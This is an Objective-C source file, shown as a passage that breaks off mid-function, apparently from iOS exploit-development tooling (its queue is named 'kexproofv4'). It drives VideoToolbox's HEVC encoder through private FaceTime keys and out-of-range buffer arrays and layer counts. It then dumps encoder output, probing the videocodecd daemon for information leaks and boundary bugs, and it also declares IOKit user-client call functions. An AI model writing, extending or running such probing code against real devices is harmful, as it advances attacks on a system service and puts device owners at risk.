#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <IOSurface/IOSurfaceRef.h>
#import <mach/mach.h>
#import <unistd.h>
#import <dlfcn.h>

typedef unsigned int kp_io_object_t;
typedef unsigned int kp_io_service_t;
typedef unsigned int kp_io_connect_t;
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kp_io_service_t IOServiceGetMatchingService(unsigned int mainPort, CFDictionaryRef matching);
extern kern_return_t IOServiceOpen(kp_io_service_t service, unsigned int owningTask, unsigned int type, kp_io_connect_t *conn);
extern kern_return_t IOServiceClose(kp_io_connect_t conn);
extern kern_return_t IOObjectRelease(kp_io_object_t obj);
extern kern_return_t IOConnectCallMethod(kp_io_connect_t conn, uint32_t selector,
                                         const uint64_t *input, uint32_t inputCnt,
                                         const void *inputStruct, size_t inputStructCnt,
                                         uint64_t *output, uint32_t *outputCnt,
                                         void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t selector,
                                               const void *inputStruct, size_t inputStructCnt,
                                               void *outputStruct, size_t *outputStructCnt);

static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    (void)src;
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    NSString *entry = nil;
    if (st != noErr || !sb) {
        entry = [NSString stringWithFormat:@"cb st=%d info=0x%x no-sample", (int)st, (unsigned)fl];
    } else {
        CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sb, false);
        NSUInteger saKeys = 0;
        NSString *saDump = @"none";
        if (saArray && CFArrayGetCount(saArray) > 0) {
            CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
            if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
                saKeys = CFDictionaryGetCount(dict);
                NSDictionary *nsDict = (__bridge NSDictionary *)dict;
                NSMutableArray *kv = [NSMutableArray array];
                for (id k in nsDict) {
                    [kv addObject:[NSString stringWithFormat:@"%@=%@", k, nsDict[k]]];
                }
                saDump = [kv componentsJoinedByString:@","];
            }
        }
        CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sb);
        size_t totalLen = 0;
        if (block) {
            totalLen = CMBlockBufferGetDataLength(block);
        }
        entry = [NSString stringWithFormat:@"cb st=%d saKeys=%lu{%@} len=%zu",
                 (int)st, (unsigned long)saKeys, saDump, totalLen];
    }
    @synchronized (sink) {
        [sink addObject:entry];
    }
}

static void KPH9Drain(NSMutableArray *sink, int expected, int timeoutMs) {
    if (!sink || expected <= 0) return;
    int waited = 0;
    while (waited < timeoutMs) {
        int now = 0;
        @synchronized (sink) {
            now = (int)sink.count;
        }
        if (now >= expected) break;
        usleep(2000);
        waited += 2;
    }
}

static void KPH9OutAppend(NSMutableString *out, NSString *fmt, ...) NS_FORMAT_FUNCTION(2, 3);
static void KPH9OutAppend(NSMutableString *out, NSString *fmt, ...) {
    if (!out || !fmt) return;
    va_list args;
    va_start(args, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
    va_end(args);
    if (!line) return;
    @synchronized (out) {
        [out appendString:line];
    }
}

// Serial bounded teardown (consumes caller's +1 create reference) and releases
// retainedRefCon / heapCtx ONLY after VTCompressionSessionInvalidate & CFRelease
// finish. Waiting up to 350 ms serializes healthy teardowns (<5 ms) so sessions
// never pile up concurrently in videocodecd, while a wedged session times out
// cleanly without deadlocking the stage thread or causing a callback UAF.
static void KPH9SafeTeardownEx(VTCompressionSessionRef s, CFTypeRef retainedRefCon, void *heapCtx) {
    if (!s) {
        if (retainedRefCon) CFRelease(retainedRefCon);
        if (heapCtx) free(heapCtx);
        return;
    }
    static dispatch_queue_t tdQueue;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        // Must be CONCURRENT: waiting on `done` below already serializes healthy
        // teardowns (<5 ms), whereas a serial queue permanently head-of-line blocks
        // all subsequent teardowns if any single session wedges in Invalidate().
        tdQueue = dispatch_queue_create("com.stealth.kexproofv4.h9.teardown", DISPATCH_QUEUE_CONCURRENT);
    });
    dispatch_semaphore_t done = dispatch_semaphore_create(0);
    dispatch_async(tdQueue, ^{
        VTCompressionSessionInvalidate(s);
        CFRelease(s);
        if (retainedRefCon) CFRelease(retainedRefCon);
        if (heapCtx) free(heapCtx);
        dispatch_semaphore_signal(done);
    });
    dispatch_semaphore_wait(done, dispatch_time(DISPATCH_TIME_NOW, 350 * (int64_t)NSEC_PER_MSEC));
}

static void KPH9SafeTeardown(VTCompressionSessionRef s) {
    KPH9SafeTeardownEx(s, NULL, NULL);
}

// Fast 500 ms probe on a fresh session to check whether videocodecd XPC is
// genuinely unreachable before skipping subsequent stages.
static BOOL KPH9IsVideoCodecdAlive(void) {
    __block BOOL alive = NO;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        VTCompressionSessionRef s = NULL;
        OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                                 kCMVideoCodecType_HEVC,
                                                 NULL, NULL, NULL, NULL, NULL, &s);
        if (st == noErr && s) {
            alive = YES;
            KPH9SafeTeardown(s);
        }
        dispatch_semaphore_signal(sem);
    });
    long w = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 500 * (int64_t)NSEC_PER_MSEC));
    return (w == 0) && alive;
}

// === Stage 6: XPC Bitstream / NAL / Attachments Leak & Exact DPB Boundary ===
// (analyst module, integrated; its bare CompleteFrames(kCMTimeInvalid) replaced
// with a bounded poll - that call deadlocks on wedged sessions)
typedef struct {
    volatile int cbCount;
    volatile int closed;
    volatile int targetIdx;
    volatile int targetHit;
    OSStatus lastStatus;
    char summary[512];
    char first[512];  // cb#1 (IDR at pts=0)
    char second[512]; // cb#2 (P-frame at pts=1, never overwritten by cb#3..4)
    char target[512]; // pinned post-update frame callback (matched via sourceFrameRefCon)
} Stage6ProbeResult;

static Stage6ProbeResult *Stage6AllocResult(void) {
    Stage6ProbeResult *res = (Stage6ProbeResult *)calloc(1, sizeof(Stage6ProbeResult));
    if (res) {
        res->targetIdx = 2;
        res->targetHit = 0;
        snprintf(res->summary, sizeof(res->summary), "(no cb)");
        snprintf(res->first, sizeof(res->first), "(no cb)");
        snprintf(res->second, sizeof(res->second), "(no cb)");
        snprintf(res->target, sizeof(res->target), "(no cb)");
    }
    return res;
}

static NSString *HexDumpSlice(const uint8_t *buf, size_t len, size_t maxBytes) {
    size_t n = (len < maxBytes) ? len : maxBytes;
    NSMutableString *hex = [NSMutableString stringWithCapacity:n * 2];
    for (size_t i = 0; i < n; i++) {
        [hex appendFormat:@"%02x", buf[i]];
    }
    return hex;
}

// Walks HVCC 4-byte length-prefixed NAL units inside CMBlockBuffer to find
// the first VCL slice NALU (nal_unit_type 0..21), skipping PREFIX_SEI (39).
static NSString *ExtractHVCCVclSliceSummary(const uint8_t *buf, size_t len) {
    if (!buf || len < 6) return @"none";
    size_t off = 0;
    unsigned naluCount = 0;
    const uint8_t *vclPtr = NULL;
    size_t vclLen = 0;
    unsigned vclType = 0xff;
    while (off + 4 <= len) {
        uint32_t naluLen = ((uint32_t)buf[off] << 24) |
                           ((uint32_t)buf[off + 1] << 16) |
                           ((uint32_t)buf[off + 2] << 8) |
                           (uint32_t)buf[off + 3];
        off += 4;
        if (naluLen == 0 || off + naluLen > len) break;
        naluCount++;
        unsigned nalType = (buf[off] >> 1) & 0x3f;
        if (nalType <= 21 && !vclPtr) {
            vclPtr = buf + off;
            vclLen = naluLen;
            vclType = nalType;
        }
        off += naluLen;
    }
    if (vclPtr) {
        return [NSString stringWithFormat:@"n=%u,t=%u,l=%zu:%@",
                naluCount, vclType, vclLen, HexDumpSlice(vclPtr, vclLen, 20)];
    }
    return [NSString stringWithFormat:@"raw(%zu):%@", len, HexDumpSlice(buf, len, 20)];
}

static void Stage6OutputCallback(void *outputCallbackRefCon,
                                 void *sourceFrameRefCon,
                                 OSStatus status,
                                 VTEncodeInfoFlags infoFlags,
                                 CMSampleBufferRef sampleBuffer) {
    BOOL isTaggedTarget = (sourceFrameRefCon == (void *)(uintptr_t)0xCAFE);
    Stage6ProbeResult *res = (Stage6ProbeResult *)outputCallbackRefCon;
    if (!res || res->closed) return;
    if (status != noErr || !sampleBuffer) {
        @synchronized ([KPH9EncoderModule class]) {
            if (res->closed) return;
            res->cbCount++;
            res->lastStatus = status;
            snprintf(res->summary, sizeof(res->summary),
                     "cb#%d st=%d info=0x%x sbuf=NULL",
                     res->cbCount, (int)status, (unsigned)infoFlags);
            if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
            if (res->cbCount == 2) snprintf(res->second, sizeof(res->second), "%s", res->summary);
            if (isTaggedTarget || (res->targetIdx > 0 && !res->targetHit && res->cbCount == res->targetIdx)) {
                res->targetIdx = res->cbCount;
                res->targetHit = 1;
                snprintf(res->target, sizeof(res->target), "%s", res->summary);
            }
        }
        return;
    }
    CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, false);
    NSUInteger saKeys = 0;
    NSString *saDump = @"";
    if (saArray && CFArrayGetCount(saArray) > 0) {
        CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
        if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
            saKeys = CFDictionaryGetCount(dict);
            NSDictionary *nsDict = (__bridge NSDictionary *)dict;
            NSMutableArray *kvParts = [NSMutableArray array];
            for (id k in nsDict) {
                [kvParts addObject:[NSString stringWithFormat:@"%@=%@", k, nsDict[k]]];
            }
            saDump = [kvParts componentsJoinedByString:@","];
        }
    }
    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
    size_t paramCount = 0;
    NSString *vpsHex = @"none";
    NSString *spsHex = @"none";
    NSString *ppsHex = @"none";
    if (fmt) {
        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &paramCount, NULL);
        const uint8_t *vpsPtr = NULL, *spsPtr = NULL, *ppsPtr = NULL;
        size_t vpsSize = 0, spsSize = 0, ppsSize = 0;
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, &vpsPtr, &vpsSize, NULL, NULL) == noErr && vpsPtr) {
            vpsHex = [NSString stringWithFormat:@"%zu:%@", vpsSize, HexDumpSlice(vpsPtr, vpsSize, 16)];
        }
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 1, &spsPtr, &spsSize, NULL, NULL) == noErr && spsPtr) {
            spsHex = [NSString stringWithFormat:@"%zu:%@", spsSize, HexDumpSlice(spsPtr, spsSize, 16)];
        }
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 2, &ppsPtr, &ppsSize, NULL, NULL) == noErr && ppsPtr) {
            ppsHex = [NSString stringWithFormat:@"%zu:%@", ppsSize, HexDumpSlice(ppsPtr, ppsSize, 12)];
        }
    }
    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sampleBuffer);
    NSString *vclSummary = @"none";
    size_t totalLen = 0;
    if (block) {
        char *dataPtr = NULL;
        size_t lengthAtOffset = 0;
        if (CMBlockBufferGetDataPointer(block, 0, &lengthAtOffset, &totalLen, &dataPtr) == noErr && dataPtr) {
            vclSummary = ExtractHVCCVclSliceSummary((const uint8_t *)dataPtr, lengthAtOffset);
        }
    }
    @synchronized ([KPH9EncoderModule class]) {
        if (res->closed) return;
        res->cbCount++;
        res->lastStatus = status;
        snprintf(res->summary, sizeof(res->summary),
                 "cb#%d st=%d info=0x%x saKeys=%lu{%s} ps=%zu vps=%s sps=%s pps=%s vcl(%zu)=%s",
                 res->cbCount, (int)status, (unsigned)infoFlags,
                 (unsigned long)saKeys, [saDump UTF8String], paramCount,
                 [vpsHex UTF8String], [spsHex UTF8String], [ppsHex UTF8String],
                 totalLen, [vclSummary UTF8String]);
        if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
        if (res->cbCount == 2) snprintf(res->second, sizeof(res->second), "%s", res->summary);
        if (isTaggedTarget || (res->targetIdx > 0 && !res->targetHit && res->cbCount == res->targetIdx)) {
            res->targetIdx = res->cbCount;
            res->targetHit = 1;
            snprintf(res->target, sizeof(res->target), "%s", res->summary);
        }
    }
}

static CVPixelBufferRef CreateDummyNV12Buffer(int width, int height) {
    CVPixelBufferRef px = NULL;
    NSDictionary *attrs = @{
        (id)kCVPixelBufferIOSurfacePropertiesKey : @{}
    };
    CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        (__bridge CFDictionaryRef)attrs, &px);
    return px;
}

static void KPH9PrimeRealTime(VTCompressionSessionRef session) {
    if (!session) return;
    // NOTE: Never set kVTCompressionPropertyKey_AllowFrameReordering = kCFBooleanFalse
    // on an EnableUserRefForFacetime session — that combination wedges H9's session
    // pipeline in videocodecd on encode[1] and hangs VTCompressionSessionInvalidate.
    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
}

// --- Analyst (in tree): real IOSurfaceID plumbing for UserDPBFramesForFaceTime ---
// SetDPBSnapShot resolves each DPB entry through IOSurfaceLookup, so only live
// IOSurfaceIDs (or 0 = empty slot) survive PrepareToEncodeFrames. The pool buffers
// MUST stay retained while any session referencing their IDs is alive — freed
// surfaces make the IDs invalid and the lookup fails.
static NSString *Stage7ReadbackDPB(VTCompressionSessionRef session);

static uint32_t KPH9GetPixelBufferSurfaceID(CVPixelBufferRef pb) {
    if (!pb) return 0;
    IOSurfaceRef surf = CVPixelBufferGetIOSurface(pb);
    if (!surf) return 0;
    return (uint32_t)IOSurfaceGetID(surf);
}

static NSArray<NSNumber *> *KPH9AllocSurfacePool(size_t count,
                                                 int width,
                                                 int height,
                                                 NSMutableArray *retainedBuffersOut) {
    NSMutableArray<NSNumber *> *ids = [NSMutableArray arrayWithCapacity:count];
    for (size_t i = 0; i < count; i++) {
        CVPixelBufferRef pb = CreateDummyNV12Buffer(width, height);
        if (pb) {
            CVPixelBufferLockBaseAddress(pb, 0);
            memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), (int)((0x20 + (i * 7)) & 0x7f),
                   CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)height);
            memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
                   CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)height / 2));
            CVPixelBufferUnlockBaseAddress(pb, 0);
            [ids addObject:@(KPH9GetPixelBufferSurfaceID(pb))];
            if (retainedBuffersOut) {
                [retainedBuffersOut addObject:(__bridge id)pb];
            }
            CFRelease(pb);
        } else {
            [ids addObject:@0];
        }
    }
    return ids;
}

static void RunStage6_XPCLeakAndBoundaryAudit(NSMutableString *log) {
    KPH9OutAppend(log, @"\n--- Stage 6: DPB Exact Boundary (1..15, 34..48) & Bitstream/NAL Audit ---\n");
    // Analyst: SetDPBSnapShot accepts only surfaces ALREADY encoded in this session
    // (internal DPB table), so warm 5 pool buffers through EncodeFrame first.
    int probeCounts[] = { 1, 2, 4, 8, 16, 30, 32, 33, 34, 35, 36, 48 };
    size_t numProbes = sizeof(probeCounts) / sizeof(probeCounts[0]);
    NSMutableArray *surfaceHolders = [NSMutableArray array];
    NSArray<NSNumber *> *poolIDs = KPH9AllocSurfacePool(18, 192, 144, surfaceHolders);
    KPH9OutAppend(log, @"  [surf pool] n=%lu ids[0..3]=%u,%u,%u,%u\n",
                  (unsigned long)poolIDs.count,
                  poolIDs.count > 0 ? poolIDs[0].unsignedIntValue : 0,
                  poolIDs.count > 1 ? poolIDs[1].unsignedIntValue : 0,
                  poolIDs.count > 2 ? poolIDs[2].unsignedIntValue : 0,
                  poolIDs.count > 3 ? poolIDs[3].unsignedIntValue : 0);
    for (size_t i = 0; i < numProbes; i++) {
        int count = probeCounts[i];
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) continue;
        res->targetIdx = -1;
        VTCompressionSessionRef session = NULL;
        // Без EncoderUsage=1 — вместе с EnableUserRefForFacetime он даёт -17691.
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, 192, 144,
            kCMVideoCodecType_HEVC, (__bridge CFDictionaryRef)spec, NULL, NULL,
            Stage6OutputCallback, res, &session);
        if (st != noErr || !session) {
            KPH9OutAppend(log, @"  dpb[x%-2d] create=%d\n", count, (int)st);
            free(res);
            continue;
        }
        VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(session, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
        KPH9PrimeRealTime(session);
        OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
        // Прогреваем сессию реальными буферами из surfaceHolders (5 кадров = IDR + 4 P/B),
        // чтобы их IOSurfaceID попали во внутренний DPB перед SetDPBSnapShot
        int64_t nextPts = 0;
        for (int warm = 0; warm < 5; warm++) {
            CVPixelBufferRef wpb = (__bridge CVPixelBufferRef)surfaceHolders[(NSUInteger)warm % surfaceHolders.count];
            VTCompressionSessionEncodeFrame(session, wpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
        }
        int ww = 0;
        while (res->cbCount < 5 && ww < 120) { usleep(2000); ww += 2; }
        NSMutableArray *dpbArr = [NSMutableArray arrayWithCapacity:(NSUInteger)count];
        for (int k = 0; k < count; k++) {
            if ((k % 2) == 0) {
                NSUInteger pairIdx = (NSUInteger)(k / 2) % 5;
                [dpbArr addObject:poolIDs[pairIdx]];
            } else {
                [dpbArr addObject:@0];
            }
        }
        OSStatus setSt = VTSessionSetProperty(
            session,
            CFSTR("UserDPBFramesForFaceTime"),
            (__bridge CFTypeRef)dpbArr);
        NSString *rbStr = Stage7ReadbackDPB(session);
        res->targetHit = 0;
        res->targetIdx = -1;
        CVPixelBufferRef pxTarget = (__bridge CVPixelBufferRef)surfaceHolders[0];
        NSDictionary *fp = @{ @"UserDPBFramesForFaceTime": dpbArr };
        VTCompressionSessionEncodeFrame(session, pxTarget, CMTimeMake(nextPts++, 30), kCMTimeInvalid,
                                        (__bridge CFDictionaryRef)fp, (void *)(uintptr_t)0xCAFE, NULL);
        for (int flush = 0; flush < 4 && !res->targetHit; flush++) {
            CVPixelBufferRef fpb = (__bridge CVPixelBufferRef)surfaceHolders[(NSUInteger)(flush + 1) % 5];
            VTCompressionSessionEncodeFrame(session, fpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int sw = 0;
            while (!res->targetHit && sw < 40) { usleep(2000); sw += 2; }
        }
        @synchronized ([KPH9EncoderModule class]) {
            res->closed = 1;
            const char *postCb = res->targetHit ? res->target : res->second;
            KPH9OutAppend(log, @"  dpb[surf x%-2d (%d pairs)] set=%-6d prep=%-6d rb=%@ cbs=%d | cb1: %s | cbPost: %s\n",
                          count, count / 2, (int)setSt, (int)prepSt, rbStr,
                          res->cbCount, res->first, postCb);
        }
        KPH9SafeTeardownEx(session, NULL, res);
    }
    KPH9OutAppend(log, @"  [6B: Dyadic Clamp Ratio Steering (ExpectedFrameRate / BaseLayerFrameRate, BaseFPS=15 >= 1.0)]\n");
    int dyadicRatios[] = { 1, 2, 4, 8, 16, 32, 64, 128, 256 };
    CVPixelBufferRef px6B = CreateDummyNV12Buffer(192, 144);
    for (size_t i = 0; i < sizeof(dyadicRatios) / sizeof(dyadicRatios[0]); i++) {
        int ratio = dyadicRatios[i];
        int expFps = 15 * ratio;
        int baseFps = 15;
        CFNumberRef nExp = CFNumberCreate(NULL, kCFNumberIntType, &expFps);
        CFNumberRef nBase = CFNumberCreate(NULL, kCFNumberIntType, &baseFps);

        // 1) EncoderUsage=1 dyadic clamp readback
        int u1PostNtl = -1;
        OSStatus u1PrepSt = -999;
        {
            VTCompressionSessionRef us = NULL;
            NSDictionary *uspec = @{
                @"EncoderUsage": @1,
                @"NumberOfTemporalLayers": @16447,
                @"AllowTemporalCompression": @YES,
            };
            if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                           kCMVideoCodecType_HEVC, (__bridge CFDictionaryRef)uspec, NULL, NULL,
                                           NULL, NULL, &us) == noErr && us) {
                VTSessionSetProperty(us, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                KPH9PrimeRealTime(us);
                VTSessionSetProperty(us, kVTCompressionPropertyKey_ExpectedFrameRate, nExp);
                VTSessionSetProperty(us, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
                VTSessionSetProperty(us, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
                u1PrepSt = VTCompressionSessionPrepareToEncodeFrames(us);
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(us, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &u1PostNtl);
                    CFRelease(rb);
                }
                KPH9SafeTeardown(us);
            }
        }

        // 2) Clean non-realtime session (Usage=0) so EncodeFrame[0] succeeds (st=0) and dumps VPS/SPS sub-layers
        Stage6ProbeResult *res = Stage6AllocResult();
        if (!res) {
            CFRelease(nExp);
            CFRelease(nBase);
            continue;
        }
        VTCompressionSessionRef session = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                       kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                                       Stage6OutputCallback, res, &session) == noErr && session) {
            VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, nExp);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
            OSStatus setNtlSt = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@16447);
            OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
            CFNumberRef postNtlRef = NULL;
            int postNtl = -1;
            if (VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &postNtlRef) == noErr && postNtlRef) {
                CFNumberGetValue(postNtlRef, kCFNumberIntType, &postNtl);
                CFRelease(postNtlRef);
            }
            if (px6B) {
                VTCompressionSessionEncodeFrame(session, px6B, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                int w0 = 0;
                while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
            }
            @synchronized ([KPH9EncoderModule class]) {
                res->closed = 1;
                KPH9OutAppend(log, @"  ratio %4d/%2d (x%-3d) -> u1Prep=%d u1POST=%d | u0Set=%d u0Prep=%d u0POST=%d | %s\n",
                              expFps, baseFps, ratio, (int)u1PrepSt, u1PostNtl,
                              (int)setNtlSt, (int)prepSt, postNtl, res->first);
            }
            KPH9SafeTeardownEx(session, NULL, res);
        } else {
            free(res);
        }
        CFRelease(nExp);
        CFRelease(nBase);
    }
    if (px6B) CVPixelBufferRelease(px6B);
}

static NSString *Stage7ReadbackDPB(VTCompressionSessionRef session) {
    CFTypeRef rbProp = NULL;
    OSStatus rbSt = VTSessionCopyProperty(session, CFSTR("UserDPBFramesForFaceTime"), kCFAllocatorDefault, &rbProp);
    if (rbSt == noErr && rbProp) {
        NSString *rbStr = nil;
        if (CFGetTypeID(rbProp) == CFArrayGetTypeID()) {
            CFIndex c = CFArrayGetCount((CFArrayRef)rbProp);
            id firstObj = (c > 0) ? [(__bridge NSArray *)rbProp firstObject] : @"empty";
            id lastObj  = (c > 0) ? [(__bridge NSArray *)rbProp lastObject]  : @"empty";
            rbStr = [NSString stringWithFormat:@"arr(%ld,first=%@,last=%@)", (long)c, firstObj, lastObj];
        } else {
            rbStr = [NSString stringWithFormat:@"type=%lu", (unsigned long)CFGetTypeID(rbProp)];
        }
        CFRelease(rbProp);
        return rbStr;
    }
    return [NSString stringWithFormat:@"err=%d", (int)rbSt];
}

// timingMode:
//   0 = @pre             (set UserDPBFramesForFaceTime BEFORE PrepareToEncodeFrames)
//   1 = @lazy            (set BEFORE EncodeFrame[0], no explicit PrepareToEncodeFrames)
//   2 = @post-prep       (call PrepareToEncodeFrames FIRST, then set UserDPBFramesForFaceTime before EncodeFrame[0])
//   3 = @post-idr        (call PrepareToEncodeFrames + EncodeFrame[0] IDR FIRST, then set UserDPBFramesForFaceTime before EncodeFrame[1])
//   4 = @post-4p         (call PrepareToEncodeFrames + IDR + 4 P/B-frames FIRST and drain cbCount>=5 so full B-pyramid populates DPB)
//   5 = @post-idr+reprep (like @post-idr, then call PrepareToEncodeFrames AGAIN after SetProperty)
//   6 = @post-idr+kf     (like @post-idr, and pass ForceKeyFrame=YES on the post-update frame so H9 re-runs sequence/GOP init)
static void Stage7RunCustomDPBArrayPool(NSMutableString *log,
                                        NSArray *poolBuffers,
                                        NSString *label,
                                        NSArray *arr,
                                        int timingMode,
                                        BOOL passInFrameProps) {
    Stage6ProbeResult *res = Stage6AllocResult();
    if (!res) return;
    res->targetIdx = -1;
    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, NULL, Stage6OutputCallback, res, &session);
    if (st != noErr || !session) {
        KPH9OutAppend(log, @"  dpb[%@] create=%d\n", label, (int)st);
        free(res);
        return;
    }
    VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
    VTSessionSetProperty(session, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
    KPH9PrimeRealTime(session);
    OSStatus setSt = -999;
    OSStatus prepSt = -999;
    NSString *rbStr = @"none";
    OSStatus e0 = -1, e1 = -1;
    int64_t nextPts = 0;
    CVPixelBufferRef px0 = poolBuffers.count ? (__bridge CVPixelBufferRef)poolBuffers[0] : NULL;
    if (timingMode == 0) {
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
        rbStr = Stage7ReadbackDPB(session);
        prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
    } else if (timingMode == 2) {
        prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
        rbStr = Stage7ReadbackDPB(session);
    } else if (timingMode >= 3) {
        prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
        if (px0) {
            e0 = VTCompressionSessionEncodeFrame(session, px0, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int w0 = 0;
            while (res->cbCount < 1 && w0 < 80) { usleep(2000); w0 += 2; }
            if (timingMode == 4) {
                // Подаём разные CVPixelBufferRef из пула, чтобы их IOSurfaceID
                // зарегистрировались во внутреннем DPB до SetDPBSnapShot
                for (int warm = 1; warm <= 4; warm++) {
                    CVPixelBufferRef wpb = (__bridge CVPixelBufferRef)poolBuffers[(NSUInteger)warm % poolBuffers.count];
                    VTCompressionSessionEncodeFrame(session, wpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
                }
                int ww = 0;
                while (res->cbCount < 5 && ww < 120) { usleep(2000); ww += 2; }
            }
        }
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
        rbStr = Stage7ReadbackDPB(session);
    }
    if (px0) {
        res->targetHit = 0;
        res->targetIdx = -1;
        if (timingMode <= 2) {
            e0 = VTCompressionSessionEncodeFrame(session, px0, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int w0 = 0;
            while (res->cbCount < 1 && w0 < 60) { usleep(2000); w0 += 2; }
        }
        NSMutableDictionary *fp = [NSMutableDictionary dictionary];
        if (passInFrameProps && arr) {
            fp[@"UserDPBFramesForFaceTime"] = arr;
        }
        CFDictionaryRef fpRef = fp.count ? (__bridge CFDictionaryRef)fp : NULL;
        CVPixelBufferRef targetPb = (__bridge CVPixelBufferRef)poolBuffers[(NSUInteger)nextPts % poolBuffers.count];
        e1 = VTCompressionSessionEncodeFrame(session, targetPb, CMTimeMake(nextPts++, 30), kCMTimeInvalid,
                                             fpRef, (void *)(uintptr_t)0xCAFE, NULL);
        int waited = 0;
        while ((!res->targetHit || res->cbCount < 2) && waited < 120) {
            usleep(2000);
            waited += 2;
        }
        for (int flush = 0; flush < 4 && (!res->targetHit || res->cbCount < 2); flush++) {
            CVPixelBufferRef fpb = (__bridge CVPixelBufferRef)poolBuffers[(NSUInteger)nextPts % poolBuffers.count];
            VTCompressionSessionEncodeFrame(session, fpb, CMTimeMake(nextPts++, 30), kCMTimeInvalid, NULL, NULL, NULL);
            int sw = 0;
            while ((!res->targetHit || res->cbCount < 2) && sw < 40) {
                usleep(2000);
                sw += 2;
            }
        }
    }
    @synchronized ([KPH9EncoderModule class]) {
        res->closed = 1;
        const char *postCb = res->targetHit ? res->target : res->second;
